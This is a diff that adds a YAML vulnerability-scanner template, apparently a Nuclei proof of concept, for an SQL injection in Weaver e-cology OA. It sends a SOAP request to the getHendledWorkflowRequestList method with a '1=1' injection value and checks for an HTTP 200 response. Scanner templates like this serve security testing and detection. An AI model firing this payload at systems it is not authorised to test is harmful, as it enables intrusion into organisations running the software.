@@ -1,0 +1,25 @@
+id: yaml-poc-weaver-e-cology-oa-sql_injection-CT-1201009
+info:
+  name: Yaml Poc Weaver E Cology Oa Sql_Injection Ct 1201009
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-e-cology-oa-sql_injection-CT-1201009'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /{{val}}
+  body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://webservices.workflow.weaver\"> <soapenv:Header/>\n  <soapenv:Body>\n\
+    \      <web:getHendledWorkflowRequestList>\n        <web:in0>1</web:in0>\n   \
+    \     <web:in1>1</web:in1>\n        <web:in2>1</web:in2>\n        <web:in3>1</web:in3>\n\
+    \        <web:in4>\n            <web:string>1=1</web:string>\n        </web:in4>\n\
+    \      </web:getHendledWorkflowRequestList>\n  </soapenv:Body>\n</soapenv:Envelope>"
+  headers:
+    Content-Type: text/xml
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
